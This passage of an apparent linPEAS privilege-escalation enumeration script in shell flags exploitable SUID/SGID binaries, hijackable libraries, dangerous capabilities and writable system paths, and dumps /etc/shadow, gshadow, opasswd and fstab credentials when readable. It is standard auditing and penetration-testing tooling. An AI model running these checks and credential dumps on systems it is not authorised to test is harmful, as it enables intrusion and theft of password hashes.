  4662	        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_LINUX" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
  4663	      fi
  4664	    fi
  4665	  done
  4666	fi
  4667	
  4668	fi
  4669	echo ''
  4670	echo ''
  4671	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  4672	
  4673	if echo $CHECKS | grep -q interesting_perms_files; then
  4674	print_title "Files with Interesting Permissions"
  4675	###########################################
  4676	#-) Files with Interesting Permissions  (-#
  4677	###########################################
  4678	
  4679	check_critial_root_path(){
  4680	  folder_path="$1"
  4681	  if [ -w "$folder_path" ]; then echo "You have write privileges over $folder_path" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  4682	  if [ "$(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges over $(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')')" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  4683	  if [ "$(find $folder_path -type f -not -user root 2>/dev/null)" ]; then echo "The following files aren't owned by root: $(find $folder_path -type f -not -user root 2>/dev/null)"; fi
  4684	}
  4685	
  4686	
  4687	
  4688	
  4689	##-- IPF) SUID
  4690	print_2title "SUID - Check easy privesc, exploits and write perms"
  4691	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
  4692	if ! [ "$STRINGS" ]; then
  4693	  echo_not_found "strings"
  4694	fi
  4695	if ! [ "$STRACE" ]; then
  4696	  echo_not_found "strace"
  4697	fi
  4698	suids_files=$(find $ROOT_FOLDER -perm -4000 -type f ! -path "/dev/*" 2>/dev/null)
  4699	for s in $suids_files; do
  4700	  s=$(ls -lahtr "$s")
  4701	  #If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
  4702	  if echo "$s" | grep -qE "^total"; then break; fi
  4703	
  4704	  sname="$(echo $s | awk '{print $9}')"
  4705	  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
  4706	    true #Don't do nothing
  4707	  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
  4708	    echo "You own the SUID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  4709	  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then #If write permision, win found (no check exploits)
  4710	    echo "You can write SUID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  4711	  else
  4712	    c="a"
  4713	    for b in $sidB; do
  4714	      if echo $s | grep -q $(echo $b | cut -d % -f 1); then
  4715	        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
  4716	        c=""
  4717	        break;
  4718	      fi
  4719	    done;
  4720	    if [ "$c" ]; then
  4721	      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
  4722	        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
  4723	      else
  4724	        echo "$s (Unknown SUID binary!)" | sed -${E} "s,/.*,${SED_RED},"
  4725	        printf $ITALIC
  4726	        if ! [ "$FAST" ]; then
  4727	          
  4728	          if [ "$STRINGS" ]; then
  4729	            $STRINGS "$sname" 2>/dev/null | sort | uniq | while read sline; do
  4730	              sline_first="$(echo "$sline" | cut -d ' ' -f1)"
  4731	              if echo "$sline_first" | grep -qEv "$cfuncs"; then
  4732	                if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then #If a path
  4733	                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
  4734	                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
  4735	                  fi
  4736	                else #If not a path
  4737	                  if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/' && echo "$sline_first" | grep -Eqv "\.\."; then #Check if existing binary
  4738	                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
  4739	                  fi
  4740	                fi
  4741	              fi
  4742	            done
  4743	          fi
  4744	
  4745	          if [ "$LDD" ] || [ "$READELF" ]; then
  4746	            echo "$ITALIC  --- Checking for writable dependencies of $sname...$NC"
  4747	          fi
  4748	          if [ "$LDD" ]; then
  4749	            "$LDD" "$sname" | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4750	          fi
  4751	          if [ "$READELF" ]; then
  4752	            "$READELF" -d "$sname" | grep PATH | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4753	          fi
  4754	          
  4755	          if [ "$TIMEOUT" ] && [ "$STRACE" ] && ! [ "$NOTEXPORT" ] && [ -x "$sname" ]; then
  4756	            printf $ITALIC
  4757	            echo "----------------------------------------------------------------------------------------"
  4758	            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
  4759	            OLD_LD_LIBRARY_PATH=$LD_LIBRARY_PATH
  4760	            export LD_LIBRARY_PATH=""
  4761	            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
  4762	            printf $NC
  4763	            export LD_LIBRARY_PATH=$OLD_LD_LIBRARY_PATH
  4764	            echo "----------------------------------------------------------------------------------------"
  4765	            echo ""
  4766	          fi
  4767	        
  4768	        fi
  4769	      fi
  4770	    fi
  4771	  fi
  4772	done;
  4773	echo ""
  4774	
  4775	
  4776	##-- IPF) SGID
  4777	print_2title "SGID"
  4778	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
  4779	sgids_files=$(find $ROOT_FOLDER -perm -2000 -type f ! -path "/dev/*" 2>/dev/null)
  4780	for s in $sgids_files; do
  4781	  s=$(ls -lahtr "$s")
  4782	  #If starts like "total 332K" then no SUID bin was found and xargs just executed "ls" in the current folder
  4783	  if echo "$s" | grep -qE "^total";then break; fi
  4784	
  4785	  sname="$(echo $s | awk '{print $9}')"
  4786	  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
  4787	    true #Don't do nothing
  4788	  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
  4789	    echo "You own the SGID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  4790	  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then #If write permision, win found (no check exploits)
  4791	    echo "You can write SGID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  4792	  else
  4793	    c="a"
  4794	    for b in $sidB; do
  4795	      if echo "$s" | grep -q $(echo $b | cut -d % -f 1); then
  4796	        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
  4797	        c=""
  4798	        break;
  4799	      fi
  4800	    done;
  4801	    if [ "$c" ]; then
  4802	      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
  4803	        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
  4804	      else
  4805	        echo "$s (Unknown SGID binary)" | sed -${E} "s,/.*,${SED_RED},"
  4806	        printf $ITALIC
  4807	        if ! [ "$FAST" ]; then
  4808	        
  4809	          if [ "$STRINGS" ]; then
  4810	            $STRINGS "$sname" | sort | uniq | while read sline; do
  4811	              sline_first="$(echo $sline | cut -d ' ' -f1)"
  4812	              if echo "$sline_first" | grep -qEv "$cfuncs"; then
  4813	                if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then #If a path
  4814	                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
  4815	                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
  4816	                  fi
  4817	                else #If not a path
  4818	                  if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/'; then #Check if existing binary
  4819	                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
  4820	                  fi
  4821	                fi
  4822	              fi
  4823	            done
  4824	          fi
  4825	
  4826	          if [ "$LDD" ] || [ "$READELF" ]; then
  4827	            echo "$ITALIC  --- Checking for writable dependencies of $sname...$NC"
  4828	          fi
  4829	          if [ "$LDD" ]; then
  4830	            "$LDD" "$sname" | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4831	          fi
  4832	          if [ "$READELF" ]; then
  4833	            "$READELF" -d "$sname" | grep PATH | grep -E "$Wfolders" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4834	          fi
  4835	            
  4836	          if [ "$TIMEOUT" ] && [ "$STRACE" ] && [ ! "$SUPERFAST" ]; then
  4837	            printf "$ITALIC"
  4838	            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
  4839	            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
  4840	            printf "$NC"
  4841	            echo ""
  4842	          fi
  4843	        
  4844	        fi
  4845	      fi
  4846	    fi
  4847	  fi
  4848	done;
  4849	echo ""
  4850	
  4851	##-- IPF) Misconfigured ld.so
  4852	if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$IAMROOT" ]; then
  4853	  print_2title "Checking misconfigurations of ld.so"
  4854	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so"
  4855	  if [ -f "/etc/ld.so.conf" ] && [ -w "/etc/ld.so.conf" ]; then 
  4856	    echo "You have write privileges over /etc/ld.so.conf" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4857	    printf $RED$ITALIC"/etc/ld.so.conf\n"$NC;
  4858	  else
  4859	    printf $GREEN$ITALIC"/etc/ld.so.conf\n"$NC;
  4860	  fi
  4861	
  4862	  echo "Content of /etc/ld.so.conf:"
  4863	  cat /etc/ld.so.conf 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4864	
  4865	  # Check each configured folder
  4866	  cat /etc/ld.so.conf 2>/dev/null | while read l; do
  4867	    if echo "$l" | grep -q include; then
  4868	      ini_path=$(echo "$l" | cut -d " " -f 2)
  4869	      fpath=$(dirname "$ini_path")
  4870	
  4871	      if [ -d "/etc/ld.so.conf" ] && [ -w "$fpath" ]; then 
  4872	        echo "You have write privileges over $fpath" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4873	        printf $RED_YELLOW$ITALIC"$fpath\n"$NC;
  4874	      else
  4875	        printf $GREEN$ITALIC"$fpath\n"$NC;
  4876	      fi
  4877	
  4878	      if [ "$(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then
  4879	        echo "You have write privileges over $(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4880	      fi
  4881	
  4882	      for f in $fpath/*; do
  4883	        if [ -w "$f" ]; then 
  4884	          echo "You have write privileges over $f" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4885	          printf $RED_YELLOW$ITALIC"$f\n"$NC;
  4886	        else
  4887	          printf $GREEN$ITALIC"  $f\n"$NC;
  4888	        fi
  4889	
  4890	        cat "$f" | grep -v "^#" | while read l2; do
  4891	          if [ -f "$l2" ] && [ -w "$l2" ]; then 
  4892	            echo "You have write privileges over $l2" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4893	            printf $RED_YELLOW$ITALIC"  - $l2\n"$NC;
  4894	          else
  4895	            echo $ITALIC"  - $l2"$NC | sed -${E} "s,$l2,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g";
  4896	          fi
  4897	        done
  4898	      done
  4899	    fi
  4900	  done
  4901	  echo ""
  4902	
  4903	
  4904	  if [ -f "/etc/ld.so.preload" ] && [ -w "/etc/ld.so.preload" ]; then 
  4905	    echo "You have write privileges over /etc/ld.so.preload" | sed -${E} "s,.*,${SED_RED_YELLOW},"; 
  4906	  else
  4907	    printf $ITALIC$GREEN"/etc/ld.so.preload\n"$NC;
  4908	  fi
  4909	  cat /etc/ld.so.preload 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  4910	  cat /etc/ld.so.preload 2>/dev/null | while read l; do
  4911	    if [ -f "$l" ] && [ -w "$l" ]; then echo "You have write privileges over $l" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  4912	  done
  4913	
  4914	fi
  4915	
  4916	##-- IPF) Capabilities
  4917	if ! [ "$SEARCH_IN_FOLDER" ]; then
  4918	  print_2title "Capabilities"
  4919	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities"
  4920	  if [ "$(command -v capsh)" ]; then
  4921	
  4922	    print_3title "Current shell capabilities"
  4923	    cat "/proc/$$/status" | grep Cap | while read -r cap_line; do
  4924	      cap_name=$(echo "$cap_line" | awk '{print $1}')
  4925	      cap_value=$(echo "$cap_line" | awk '{print $2}')
  4926	      if [ "$cap_name" = "CapEff:" ]; then
  4927	        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED_YELLOW},")"
  4928	      else
  4929	        echo "$cap_name  $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED},")"
  4930	      fi
  4931	    done
  4932	    echo ""
  4933	
  4934	    print_3title "Parent process capabilities"
  4935	    cat "/proc/$PPID/status" | grep Cap | while read -r cap_line; do
  4936	      cap_name=$(echo "$cap_line" | awk '{print $1}')
  4937	      cap_value=$(echo "$cap_line" | awk '{print $2}')
  4938	      if [ "$cap_name" = "CapEff:" ]; then
  4939	        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED_YELLOW},")"
  4940	      else
  4941	        echo "$cap_name	 $(capsh --decode=0x"$cap_value" | sed -${E} "s,$capsB,${SED_RED},")"
  4942	      fi
  4943	    done
  4944	    echo ""
  4945	  
  4946	  else
  4947	    print_3title "Current shell capabilities"
  4948	    (cat "/proc/$$/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$$/status"
  4949	    echo ""
  4950	    
  4951	    print_3title "Parent proc capabilities"
  4952	    (cat "/proc/$PPID/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$PPID/status"
  4953	    echo ""
  4954	  fi
  4955	  echo ""
  4956	  echo "Files with capabilities (limited to 50):"
  4957	  getcap -r / 2>/dev/null | head -n 50 | while read cb; do
  4958	    capsVB_vuln=""
  4959	    
  4960	    for capVB in $capsVB; do
  4961	      capname="$(echo $capVB | cut -d ':' -f 1)"
  4962	      capbins="$(echo $capVB | cut -d ':' -f 2)"
  4963	      if [ "$(echo $cb | grep -Ei $capname)" ] && [ "$(echo $cb | grep -E $capbins)" ]; then
  4964	        echo "$cb" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  4965	        capsVB_vuln="1"
  4966	        break
  4967	      fi
  4968	    done
  4969	    
  4970	    if ! [ "$capsVB_vuln" ]; then
  4971	      echo "$cb" | sed -${E} "s,$capsB,${SED_RED},"
  4972	    fi
  4973	
  4974	    if ! [ "$IAMROOT" ] && [ -w "$(echo $cb | cut -d" " -f1)" ]; then
  4975	      echo "$cb is writable" | sed -${E} "s,.*,${SED_RED},"
  4976	    fi
  4977	  done
  4978	  echo ""
  4979	fi
  4980	
  4981	##-- IPF) Users with capabilities
  4982	if [ -f "/etc/security/capability.conf" ] || [ "$DEBUG" ]; then
  4983	  print_2title "Users with capabilities"
  4984	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities"
  4985	  if [ -f "/etc/security/capability.conf" ]; then
  4986	    grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  4987	  else echo_not_found "/etc/security/capability.conf"
  4988	  fi
  4989	  echo ""
  4990	fi
  4991	
  4992	##-- IPF) AppArmor profiles to prevent suid/capabilities abuse
  4993	if ! [ "$SEARCH_IN_FOLDER" ]; then
  4994	  if [ -d "/etc/apparmor.d/" ] && [ -r "/etc/apparmor.d/" ]; then
  4995	    print_2title "AppArmor binary profiles"
  4996	    ls -l /etc/apparmor.d/ 2>/dev/null | grep -E "^-" | grep "\."
  4997	    echo ""
  4998	  fi
  4999	fi
  5000	
  5001	##-- IPF) Files with ACLs
  5002	print_2title "Files with ACLs (limited to 50)"
  5003	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls"
  5004	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5005	  ( (getfacl -t -s -R -p /bin /etc $HOMESEARCH /opt /sbin /usr /tmp /root 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  5006	else
  5007	  ( (getfacl -t -s -R -p $SEARCH_IN_FOLDER 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  5008	fi
  5009	
  5010	if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$(command -v getfacl)" ]; then  #Find ACL files in macos (veeeery slow)
  5011	  ls -RAle / 2>/dev/null | grep -v "group:everyone deny delete" | grep -E -B1 "\d: " | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  5012	fi
  5013	echo ""
  5014	
  5015	##-- IPF) Files with ResourceFork
  5016	#if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then # TOO SLOW, CHECK IT LATER
  5017	#  print_2title "Files with ResourceFork"
  5018	#  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#resource-forks-or-macos-ads"
  5019	#  find $HOMESEARCH -type f -exec ls -ld {} \; 2>/dev/null | grep -E ' [x\-]@ ' | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.ResourceFork"
  5020	#fi
  5021	#echo ""
  5022	
  5023	##-- IPF) Files (scripts) in /etc/profile.d/
  5024	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5025	  print_2title "Files (scripts) in /etc/profile.d/"
  5026	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files"
  5027	  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then #Those folders donM-BM-4t exist on a MacOS
  5028	    (ls -la /etc/profile.d/ 2>/dev/null | sed -${E} "s,$profiledG,${SED_GREEN},") || echo_not_found "/etc/profile.d/"
  5029	    check_critial_root_path "/etc/profile"
  5030	    check_critial_root_path "/etc/profile.d/"
  5031	  fi
  5032	  echo ""
  5033	fi
  5034	
  5035	  ##-- IPF) Files (scripts) in /etc/init.d/
  5036	  if ! [ "$SEARCH_IN_FOLDER" ]; then
  5037	print_2title "Permissions in init, init.d, systemd, and rc.d"
  5038	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d"
  5039	  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then #Those folders donM-BM-4t exist on a MacOS
  5040	    check_critial_root_path "/etc/init/"
  5041	    check_critial_root_path "/etc/init.d/"
  5042	    check_critial_root_path "/etc/rc.d/init.d"
  5043	    check_critial_root_path "/usr/local/etc/rc.d"
  5044	    check_critial_root_path "/etc/rc.d"
  5045	    check_critial_root_path "/etc/systemd/"
  5046	    check_critial_root_path "/lib/systemd/"
  5047	  fi
  5048	
  5049	  echo ""
  5050	fi
  5051	
  5052	
  5053	
  5054	##-- IPF) Hashes in passwd file
  5055	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5056	  print_list "Hashes inside passwd file? ........... "
  5057	  if grep -qv '^[^:]*:[x\*\!]\|^#\|^$' /etc/passwd /etc/master.passwd /etc/group 2>/dev/null; then grep -v '^[^:]*:[x\*]\|^#\|^$' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  5058	  else echo_no
  5059	  fi
  5060	
  5061	  ##-- IPF) Writable in passwd file
  5062	  print_list "Writable passwd file? ................ "
  5063	  if [ -w "/etc/passwd" ]; then echo "/etc/passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5064	  elif [ -w "/etc/pwd.db" ]; then echo "/etc/pwd.db is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5065	  elif [ -w "/etc/master.passwd" ]; then echo "/etc/master.passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5066	  else echo_no
  5067	  fi
  5068	
  5069	  ##-- IPF) Credentials in fstab
  5070	  print_list "Credentials in fstab/mtab? ........... "
  5071	  if grep -qE "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null; then grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  5072	  else echo_no
  5073	  fi
  5074	
  5075	  ##-- IPF) Read shadow files
  5076	  print_list "Can I read shadow files? ............. "
  5077	  if [ "$(cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null)" ]; then cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  5078	  else echo_no
  5079	  fi
  5080	
  5081	  print_list "Can I read shadow plists? ............ "
  5082	  possible_check=""
  5083	  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no
  5084	
  5085	  print_list "Can I write shadow plists? ........... "
  5086	  possible_check=""
  5087	  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -w "$l" ];then echo "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no
  5088	
  5089	  ##-- IPF) Read opasswd file
  5090	  print_list "Can I read opasswd file? ............. "
  5091	  if [ -r "/etc/security/opasswd" ]; then cat /etc/security/opasswd 2>/dev/null || echo ""
  5092	  else echo_no
  5093	  fi
  5094	
  5095	  ##-- IPF) network-scripts
  5096	  print_list "Can I write in network-scripts? ...... "
  5097	  if ! [ "$IAMROOT" ] && [ -w "/etc/sysconfig/network-scripts/" ]; then echo "You have write privileges on /etc/sysconfig/network-scripts/" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5098	  elif [ "$(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges on $(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  5099	  else echo_no
  5100	  fi
  5101	
  5102	  ##-- IPF) Read root dir
  5103	  print_list "Can I read root folder? .............. "
  5104	  (ls -al /root/ 2>/dev/null | grep -vi "total 0") || echo_no
  5105	  echo ""
  5106	fi
  5107	
  5108	##-- IPF) Root files in home dirs
  5109	if ! [ "$SEARCH_IN_FOLDER" ]; then
  5110	  print_2title "Searching root files in home dirs (limit 30)"
  5111	  (find $HOMESEARCH -user root 2>/dev/null | head -n 30 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
  5112	  echo ""
  5113	fi
  5114	
  5115	##-- IPF) Others files in my dirs
  5116	if ! [ "$IAMROOT" ]; then
  5117	  print_2title "Searching folders owned by me containing others files on it (limit 100)"
  5118	  (find $ROOT_FOLDER -type d -user "$USER" ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -n 100 | while read d; do find "$d" -maxdepth 1 ! -user "$USER" \( -type f -or -type d \) -exec ls -l {} \; 2>/dev/null; done) | sort | uniq | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed "s,root,${C}[1;13m&${C}[0m,g"
  5119	  echo ""
  5120	fi
  5121	
  5122	##-- IPF) Readable files belonging to root and not world readable
  5123	if ! [ "$IAMROOT" ]; then
  5124	  print_2title "Readable files belonging to root and readable by me but not world readable"
  5125	  (find $ROOT_FOLDER -type f -user root ! -perm -o=r ! -path "/proc/*" 2>/dev/null | grep -v "\.journal" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null | sed -${E} "s,/.*,${SED_RED},"; fi; done) || echo_not_found
  5126	  echo ""
  5127	fi
  5128	
  5129	##-- IPF) Interesting writable files by ownership or all
  5130	if ! [ "$IAMROOT" ]; then
  5131	  print_2title "Interesting writable files owned by me or writable by everyone (not in Home) (max 500)"
  5132	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"
  5133	  #In the next file, you need to specify type "d" and "f" to avoid fake link files apparently writable by all
  5134	  obmowbe=$(find $ROOT_FOLDER '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | sort | uniq | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
  5135	  printf "%s\n" "$obmowbe" | while read entry; do
  5136	    if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
  5137	    elif echo "$entry" | grep -qE "$writeVB"; then
  5138	      echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
  5139	    else
  5140	      echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
  5141	    fi
  5142	  done
  5143	  echo ""
  5144	fi
  5145	
  5146	##-- IPF) Interesting writable files by group
  5147	if ! [ "$IAMROOT" ]; then
  5148	  print_2title "Interesting GROUP writable files (not in Home) (max 500)"
  5149	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"
  5150	  for g in $(groups); do
  5151	    iwfbg=$(find $ROOT_FOLDER '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
  5152	    if [ "$iwfbg" ] || [ "$DEBUG" ]; then
  5153	      printf "  Group $GREEN$g:\n$NC";
  5154	      printf "%s\n" "$iwfbg" | while read entry; do
  5155	        if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
